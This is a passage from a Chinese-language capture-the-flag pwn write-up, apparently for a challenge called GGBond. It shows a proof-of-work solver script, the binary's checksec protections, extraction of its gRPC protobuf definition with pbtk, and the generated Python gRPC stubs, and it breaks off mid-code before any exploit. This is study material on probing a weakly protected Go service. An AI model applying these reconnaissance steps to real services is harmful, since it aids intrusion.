生成所有可能的4字符组合</span>    all_combinations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>comb<span class="token punctuation">)</span> <span class="token keyword">for</span> comb <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>characters<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 遍历所有组合，寻找满足条件的字符串</span>    <span class="token keyword">for</span> comb <span class="token keyword">in</span> all_combinations<span class="token punctuation">:</span>        proof <span class="token operator">=</span> comb <span class="token operator">+</span> rev  <span class="token comment"># 拼接字符串</span>        digest <span class="token operator">=</span> sha256<span class="token punctuation">(</span>proof<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 计算SHA-256哈希值</span>        <span class="token keyword">if</span> target_digest <span class="token operator">==</span> digest<span class="token punctuation">:</span>  <span class="token comment"># 检查哈希值是否与目标摘要匹配</span>            result <span class="token operator">=</span> comb  <span class="token comment"># 如果匹配，保存结果</span>            <span class="token keyword">break</span>    <span class="token comment"># 将找到的解决方案发送给服务器</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>         <span class="token comment"># 接收下一步的连接指令</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' nc '</span><span class="token punctuation">)</span>    rev <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 使用正则表达式提取目标IP地址和端口号</span>    pattern <span class="token operator">=</span> <span class="token string">r'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\s(\d+)'</span>    result <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> rev<span class="token punctuation">)</span>    target_ip <span class="token operator">=</span> result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    target_port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 等待3秒</span>    <span class="token keyword">return</span> target_ip<span class="token punctuation">,</span> target_port  <span class="token comment"># 返回目标IP地址和端口号</span>        <span class="token comment"># 调用函数并保存结果</span>target_ip<span class="token punctuation">,</span> target_port <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>Proof of Work (PoW)</code> 是一种共识机制，它通过要求请求者完成一项计算工作来证明其请求的合法性。这段代码的主要作用是通过解决<code>Proof of Work (PoW)</code>来获取远程服务器指定的下一目标<code>IP</code>地址和端口号</p></blockquote><p>运行<code>pwn</code>看看，监听了<code>23334</code>端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$./pwn<span class="token number">2024</span>/03/21 <span class="token number">14</span>:36:52 server listening at <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:23334<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>docker/bin</code>中有一个<code>pwn</code>文件，检查保护</p><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放到<code>IDA</code>里分析，是一个<code>go</code>程序（好好好，也是第一次写</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">469</span>D80<span class="token operator">:</span> using guessed type <span class="token keyword">void</span> __golang __noreturn <span class="token function">start</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>.gopclntab</code>段存在以下内容</p><pre class="line-numbers language-none"><code class="language-none">aGoogleGolangOr_353 db &#39;google.golang.org&#x2F;grpc&#x2F;internal&#x2F;transport.(*http2Server).WriteHeaderaGoogleGolangOr_55 db &#39;google.golang.org&#x2F;protobuf&#x2F;internal&#x2F;encoding&#x2F;json.init&#39;,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>RPC (Remote Procedure Call)</code>远程过程调用，允许一台计算机通过网络调用另一台计算机上的程序或函数，<code>RPC</code>框架通常负责打包（序列化）请求参数，传输消息，在服务器端解包（反序列化）参数，执行远程过程，并将结果返回给客户端</p></blockquote><blockquote><p><code>gRPC</code>是由<code>Google</code>开发的现代开源高性能<code>RPC</code>框架，支持多种编程语言。<code>gRPC</code>默认使用<code>Protocol Buffers（protobuf）</code>作为接口定义语言（<code>IDL</code>）和其底层消息交换格式，提供了一种简洁高效的方式来定义服务和生成客户端和服务器代码</p></blockquote><blockquote><p><code>Protobuf（Protocol Buffers）</code>是<code>Google</code>开发的一种语言中立、平台中立、可扩展的序列化结构数据的方法，广泛用于通信协议和数据存储等多种场合</p></blockquote><p>可以使用<code>pbtk（Protobuf Toolkit）</code>工具反编译和重新编译<code>Google Protobuf</code>：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><blockquote><p><code>pbtk（Protobuf Toolkit）</code>是一套成熟的脚本，可通过统一的 <code>GUI</code> 访问，它提供两个主要功能：</p><ul><li><strong>从程序中提取<code>Protobuf</code>结构</strong>，将其转换回可替代的<code>.proto</code></li><li><strong>通过方便的图形界面编辑、重播和模糊</strong>发送到 <code>Protobuf </code>网络端点的数据</li></ul></blockquote><p>工具安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip <span class="token function">git</span> openjdk-9-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5$ <span class="token function">sudo</span> pip3 <span class="token function">install</span> protobuf pyqt5 pyqtwebengine requests websocket-client$ <span class="token function">git</span> clone https://github.com/marin-m/pbtk$ <span class="token builtin class-name">cd</span> pbtk$ ./gui.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择<code>step1</code>选<code>pwn</code>文件，在<code>.pbtk</code>文件夹中得到<code>ggbond.proto</code>，以下是加注释版</p><blockquote><p><code>.proto</code> 文件是使用 <code>Protocol Buffers (protobuf) </code>定义数据结构的文本文件</p></blockquote><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token comment">// 指定使用protobuf的第三版语法</span><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token comment">// 定义了一个包名GGBond，这有助于防止命名冲突，并可能被用于生成的代码包路径等</span><span class="token keyword">package</span> GGBond<span class="token punctuation">;</span><span class="token comment">// 指定生成的Go代码的包路径和包名，这里指示protoc生成的Go代码位于"./"目录下，包名为ggbond</span><span class="token keyword">option</span> go_package <span class="token operator">=</span> <span class="token string">"./;ggbond"</span><span class="token punctuation">;</span><span class="token comment">// 定义一个服务GGBondServer，它包含了一个RPC方法Handler</span><span class="token keyword">service</span> <span class="token class-name">GGBondServer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Handler方法接受一个Request类型的请求，并返回一个Response类型的响应</span>    <span class="token keyword">rpc</span> <span class="token function">Handler</span><span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token class-name">Response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义一个Request消息，包含一个名为request的oneof字段，表示请求可以是以下类型之一</span><span class="token keyword">message</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// oneof关键字表示request字段只能设置其一</span>    <span class="token keyword">oneof</span> request <span class="token punctuation">&#123;</span>        <span class="token positional-class-name class-name">WhoamiRequest</span> whoami <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>          <span class="token comment">// Whoami请求</span>        <span class="token positional-class-name class-name">RoleChangeRequest</span> role_change <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span> <span class="token comment">// 角色变更请求</span>        <span class="token positional-class-name class-name">RepeaterRequest</span> repeater <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>      <span class="token comment">// 重复器请求</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义一个Response消息，包含一个名为response的oneof字段，表示响应可以是以下类型之一</span><span class="token keyword">message</span> <span class="token class-name">Response</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">oneof</span> response <span class="token punctuation">&#123;</span>        <span class="token positional-class-name class-name">WhoamiResponse</span> whoami <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>          <span class="token comment">// Whoami响应</span>        <span class="token positional-class-name class-name">RoleChangeResponse</span> role_change <span class="token operator">=</span> <span class="token number">201</span><span class="token punctuation">;</span> <span class="token comment">// 角色变更响应</span>        <span class="token positional-class-name class-name">RepeaterResponse</span> repeater <span class="token operator">=</span> <span class="token number">202</span><span class="token punctuation">;</span>      <span class="token comment">// 重复器响应</span>        <span class="token positional-class-name class-name">ErrorResponse</span> error <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span>            <span class="token comment">// 错误响应</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义WhoamiRequest消息类型，用于Whoami请求，不包含任何字段</span><span class="token keyword">message</span> <span class="token class-name">WhoamiRequest</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义WhoamiResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">WhoamiResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RoleChangeRequest消息类型，包含一个role字段，类型为uint32</span><span class="token keyword">message</span> <span class="token class-name">RoleChangeRequest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint32</span> role <span class="token operator">=</span> <span class="token number">1001</span><span class="token punctuation">;</span> <span class="token comment">// 请求中指定的角色</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RoleChangeResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RoleChangeResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2001</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RepeaterRequest消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RepeaterRequest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">1002</span><span class="token punctuation">;</span> <span class="token comment">// 请求中包含的消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义RepeaterResponse消息类型，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">RepeaterResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2002</span><span class="token punctuation">;</span> <span class="token comment">// 响应消息</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义ErrorResponse消息类型，用于错误响应，包含一个message字段，类型为string</span><span class="token keyword">message</span> <span class="token class-name">ErrorResponse</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span> <span class="token comment">// 错误消息</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译<code>Google Protobuf</code>,这里需要先安装<code>grpc_tools</code>（编译<code>.proto</code>文件的<code>gRPC</code>插件,<code>Protocol Buffers（Protobuf）</code>编译器的<code>Python</code>版本），这样就得到了<code>ggbond_pb2_grpc.py</code> 、<code>ggbond_pb2.py</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> grpcio-toolspython3 <span class="token parameter variable">-m</span> grpc_tools.protoc -I. <span class="token parameter variable">--python_out</span><span class="token operator">=</span>. <span class="token parameter variable">--grpc_python_out</span><span class="token operator">=</span>. ggbond.proto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>ggbond_pb2_grpc.py</code>：包含了<code>grpc</code>服务的<code>Python</code>代码，定义了服务和客户端类，这样就可以使用<code>python</code>应用程序实现和调用定义在<code>.proto</code>文件中的<code>grpc</code>服务，用于构建和部署<code>grpc</code>服务，可以在服务端实现这些类中定义的接口，并在客户端创建对应的存根来远程调用这些接口</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!</span><span class="token triple-quoted-string string">"""Client and server classes corresponding to protobuf-defined services."""</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2 <span class="token keyword">as</span> ggbond__pb2<span class="token comment">#这个类是客户端存根，用于向gRPC服务发起调用</span><span class="token keyword">class</span> <span class="token class-name">GGBondServerStub</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Constructor.        Args:            channel: A grpc.Channel.        """</span>        self<span class="token punctuation">.</span>Handler <span class="token operator">=</span> channel<span class="token punctuation">.</span>unary_unary<span class="token punctuation">(</span>                <span class="token string">'/GGBond.GGBondServer/Handler'</span><span class="token punctuation">,</span>                request_serializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>                response_deserializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token comment">#服务端的基类，用于实现.proto文件中定义的服务方法</span><span class="token keyword">class</span> <span class="token class-name">GGBondServerServicer</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token comment">#服务端需要实现的业务逻辑</span>    <span class="token keyword">def</span> <span class="token function">Handler</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>        context<span class="token punctuation">.</span>set_code<span class="token punctuation">(</span>grpc<span class="token punctuation">.</span>StatusCode<span class="token punctuation">.</span>UNIMPLEMENTED<span class="token punctuation">)</span>        context<span class="token punctuation">.</span>set_details<span class="token punctuation">(</span><span class="token string">'Method not implemented!'</span><span class="token punctuation">)</span>        <span class="token keyword">raise</span> NotImplementedError<span class="token punctuation">(</span><span class="token string">'Method not implemented!'</span><span class="token punctuation">)</span><span class="token comment">#实现了GGBondServerServicer接口的服务添加到gRPC服务器</span><span class="token keyword">def</span> <span class="token function">add_GGBondServerServicer_to_server</span><span class="token punctuation">(</span>servicer<span class="token punctuation">,</span> server<span class="token punctuation">)</span><span class="token punctuation">:</span>    rpc_method_handlers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'Handler'</span><span class="token punctuation">:</span> grpc<span class="token punctuation">.</span>unary_unary_rpc_method_handler<span class="token punctuation">(</span>                    servicer<span class="token punctuation">.</span>Handler<span class="token punctuation">,</span>                    request_deserializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>                    response_serializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    generic_handler <span class="token operator">=</span> grpc<span class="token punctuation">.</span>method_handlers_generic_handler<span class="token punctuation">(</span>            <span class="token string">'GGBond.GGBondServer'</span><span class="token punctuation">,</span> rpc_method_handlers<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>add_generic_rpc_handlers<span class="token punctuation">(</span><span class="token punctuation">(</span>generic_handler<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#提供了一个静态方法，用于从客户端直接通过gRPC调用Handler服务方法</span> <span class="token comment"># This class is part of an EXPERIMENTAL API.</span><span class="token keyword">class</span> <span class="token class-name">GGBondServer</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">Handler</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>            target<span class="token punctuation">,</span>            options<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            channel_credentials<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            call_credentials<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            insecure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>            compression<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            wait_for_ready<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            metadata<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> grpc<span class="token punctuation">.</span>experimental<span class="token punctuation">.</span>unary_unary<span class="token punctuation">(</span>request<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token string">'/GGBond.GGBondServer/Handler'</span><span class="token punctuation">,</span>            ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>            ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>            options<span class="token punctuation">,</span> channel_credentials<span class="token punctuation">,</span>            insecure<span class="token punctuation">,</span> call_credentials<span class="token punctuation">,</span> compression<span class="token punctuation">,</span> wait_for_ready<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> metadata<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ggbond_pb2.py</code>：包含了<code>.proto</code>文件中定义的所有消息（<code>Protobuf</code>消息）的<code>Python</code>类，提供了消息的序列化和反序列化功能，以及对消息字段的访问方法，用于在<code>python</code>程序中使用<code>.proto</code>文件中定义的数据结构来存储数据、通信</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><span class="token comment"># source: ggbond.proto</span><span class="token comment"># Protobuf Python Version: 4.25.1</span><span class="token triple-quoted-string string">"""Generated protocol buffer code."""</span><span class="token comment">#导入了几个用于处理protobuf消息的Python模块,这些模块包含了用于创建和管理protobuf描述符、符号数据库等的功能</span><span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor <span class="token keyword">as</span> _descriptor<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor_pool <span class="token keyword">as</span> _descriptor_pool<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> symbol_database <span class="token keyword">as</span> _symbol_database<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf<span class="token punctuation">.</span>internal <span class="token keyword">import</span> builder <span class="token keyword">as</span> _builder<span class="token comment"># @@protoc_insertion_point(imports)</span><span class="token comment">#创建一个符号数据库实例，用于注册和查找生成的protobuf消息和枚举类型</span>_sym_db <span class="token operator">=</span> _symbol_database<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#通过将protobuf定义序列化为二进制形式添加到描述符池中来注册GGbond.proto文件中定义的所有消息和枚举类型,以便在运行时能够通过名称查找和使用这些类型</span>DESCRIPTOR <span class="token operator">=</span> _descriptor_pool<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddSerializedFile<span class="token punctuation">(</span><span class="token string">b'\n\x0cggbond.proto\x12\x06GGBond\"\x9c\x01\n\x07Request\x12\'\n\x06whoami\x18\x64 \x01(\x0b\x32\x15.GGBond.WhoamiRequestH\x00\x12\x30\n\x0brole_change\x18\x65 \x01(\x0b\x32\x19.GGBond.RoleChangeRequestH\x00\x12+\n\x08repeater\x18\x66 \x01(\x0b\x32\x17.GGBond.RepeaterRequestH\x00\x42\t\n\x07request\"\xcd\x01\n\x08Response\x12)\n\x06whoami\x18\xc8\x01 \x01(\x0b\x32\x16.GGBond.WhoamiResponseH\x00\x12\x32\n\x0brole_change\x18\xc9\x01 \x01(\x0b\x32\x1a.GGBond.RoleChangeResponseH\x00\x12-\n\x08repeater\x18\xca\x01 \x01(\x0b\x32\x18.GGBond.RepeaterResponseH\x00\x12\'\n\x05\x65rror\x18\xbc\x03 \x01(\x0b\x32\x15.GGBond.ErrorResponseH\x00\x42\n\n\x08response\"\x0f\n\rWhoamiRequest\"\"\n\x0eWhoamiResponse\x12\x10\n\x07message\x18\xd0\x0f \x01(\t\"\"\n\x11RoleChangeRequest\x12\r\n\x04role\x18\xe9\x07 \x01(\r\"&amp;\n\x12RoleChangeResponse\x12\x10\n\x07message\x18\xd1\x0f \x01(\t\"#\n\x0fRepeaterRequest\x12\x10\n\x07message\x18\xea\x07 \x01(\t\"$\n\x10RepeaterResponse\x12\x10\n\x07message\x18\xd2\x0f \x01(\t\"!\n\rErrorResponse\x12\x10\n\x07message\x18\xdc\" \x01(\t2&lt;\n\x0cGGBondServer\x12,\n\x07Handler\x12\x0f.GGBond.Request\x1a\x10.GGBond.ResponseB\x0bZ\t./;ggbondb\x06proto3'</span><span class="token punctuation">)</span><span class="token comment">#使用DESCRIPTOR来生成Python中的消息类和枚举,这些函数负责创建对应于.proto文件中定义的消息类型的Python类</span>_globals <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span>_builder<span class="token punctuation">.</span>BuildMessageAndEnumDescriptors<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">,</span> _globals<span class="token punctuation">)</span>_builder<span class="token punctuation">.</span>BuildTopDescriptorsAndMessages<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">,</span> <span class="token string">'ggbond_pb2'</span><span class="token punctuation">,</span> _globals<span class="token punctuation">)</span><span class="token keyword">if</span> _descriptor<span class="token punctuation">.</span>_USE_C_DESCRIPTORS <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>  _globals<span class="token punctuation">[</span><span class="token string">'DESCRIPTOR'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_options <span class="token operator">=</span> <span class="token boolean">None</span>  _globals<span class="token punctuation">[</span><span class="token string">'DESCRIPTOR'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_options <span class="token operator">=</span> <span class="token string">b'Z\t./;ggbond'</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">25</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">181</span>  _globals<span class="token punctuation">[</span><span class="token string">'_RESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">184</span>  _globals<span class="token punctuation">[</span><span class="token string">'_RESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">389</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">391</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">406</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">408</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">442</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGEREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">444</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGEREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">478</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGERESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">480</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGERESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">518</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">520</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">555</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">557</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">593</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ERRORRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">595</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ERRORRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">628</span>  _globals<span class="token punctuation">[</span><span class="token string">'_GGBONDSERVER'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">630</span>  _globals<span class="token punctuation">[</span><span class="token string">'_GGBONDSERVER'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">690</span><span class="token comment"># @@protoc_insertion_point(module_scope)</span><span aria-hidden="true" 